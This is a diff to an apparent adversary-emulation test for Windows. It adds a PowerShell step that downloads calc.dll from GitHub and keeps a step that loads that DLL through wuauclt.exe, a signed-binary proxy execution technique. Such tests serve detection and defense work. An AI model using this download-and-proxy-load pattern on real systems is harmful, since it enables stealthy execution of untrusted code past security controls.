@@ -15,6 +15,13 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        DLL to load must exist on disk as specified location (#{arbitrary_dll})
+      inline: |
+        if (test-path "#{arbitrary_dll}"){exit 0} else {{New-Item -Type Directory (split-path "#{arbitrary_dll}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true" -OutFile "#{arbitrary_dll}"
+        }}
+      executor: powershell
     - name: load-arbitrary-dll-via-wuauclt-(windows-update-client)
       inline: |
         wuauclt.exe /UpdateDeploymentProvider "{{.Args.arbitrary_dll}}" /RunHandlerComServer
